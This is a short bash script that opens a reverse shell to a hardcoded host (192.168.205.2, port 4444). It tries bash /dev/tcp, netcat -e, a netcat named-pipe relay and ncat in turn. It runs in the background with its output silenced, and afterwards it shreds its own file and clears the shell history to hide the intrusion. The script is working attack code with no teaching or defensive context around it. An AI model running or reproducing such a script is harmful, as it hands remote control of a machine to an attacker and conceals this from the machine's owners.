#!/bin/bash

RHOST="192.168.205.2"
RPORT=4444

(
    exec >/dev/null 2>&1

    cleanup() {
        [ -e "/tmp/.pipe$$" ] && rm -f "/tmp/.pipe$$"
        [ -e "$0" ] && shred -u "$0" 2>/dev/null || rm -f "$0"
        history -c 2>/dev/null
        export HISTFILE=/dev/null
    }

    reverse_shell() {
        # Bash TCP
        if command -v bash >/dev/null; then
            bash -c "bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1"
            cleanup && exit
        fi

        # Netcat traditional
        if command -v nc >/dev/null; then
            nc $RHOST $RPORT -e /bin/bash && cleanup && exit
        fi

        # Netcat with named pipe
        if command -v nc >/dev/null; then
            mkfifo /tmp/.pipe$$
            cat /tmp/.pipe$$ | /bin/sh -i 2>&1 | nc $RHOST $RPORT > /tmp/.pipe$$
            cleanup && exit
        fi

        # Ncat (modern)
        if command -v ncat >/dev/null; then
            ncat $RHOST $RPORT -e /bin/bash
            cleanup && exit
        fi
    }

    sleep 1
    reverse_shell
) &
